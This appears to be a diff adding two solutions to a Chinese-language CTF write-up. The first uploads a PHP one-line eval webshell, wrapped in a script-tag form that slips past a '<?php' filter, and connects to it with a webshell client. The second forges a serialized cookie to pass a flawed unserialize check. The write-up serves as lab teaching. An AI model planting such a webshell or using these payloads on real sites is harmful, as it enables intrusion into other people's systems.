@@ -1304,6 +1304,52 @@ one data of web1002-2.flag2's address is .
 
 <p>ps:由于遍历数据的时候设定的值为20 所以 flag只遍历出了前20位  有兴趣的话可以自行修改自己动手测试一下代码</p>
 
+<ul>
+<li>文件包含2</li>
+</ul>
+
+<p>点击去啥都没有，查看源代码，注释了一个upload.php,尝试访问</p>
+
+<p>上传一个一句话木马，或者图片马，绕过就不讲了，主要说一下过滤了&lt;?php?&gt;,一句话木马可以这样写</p>
+
+<pre><code>&lt;script language=php&gt;@eval($_POST['a']);&lt;/script&gt;
+</code></pre>
+
+<p>菜刀连接即可</p>
+
+<ul>
+<li>flag.php</li>
+</ul>
+
+<p>hint，，，，看了wp才知道传进去一个hint值即可得到源代码</p>
+
+<pre><code>&lt;?php 
+error_reporting(0); 
+include_once(&quot;flag.php&quot;); 
+$cookie = $_COOKIE['ISecer']; 
+if(isset($_GET['hint'])){ 
+    show_source(__FILE__); 
+} 
+elseif (unserialize($cookie) === &quot;$KEY&quot;) 
+{    
+    echo &quot;$flag&quot;; 
+} 
+else { 
+?&gt; 
+.......
+&lt;?php 
+} 
+$KEY='ISecer:www.isecer.com'; 
+?&gt;
+</code></pre>
+
+<p>省略了中间的html部分，就是设置一个cookie name=ISecer 然后反序列化后等于$KEY</p>
+
+<p>这里有点坑，，就是key值是在后面赋值的，也就是说，在比较的时候key为空，所以设置的cookie值为</p>
+
+<pre><code>Cookie: ISecer=s:0:&quot;&quot;;
+</code></pre>
+
 <hr />
 
 <h2 id="未完待续">未完待续 ~~</h2>
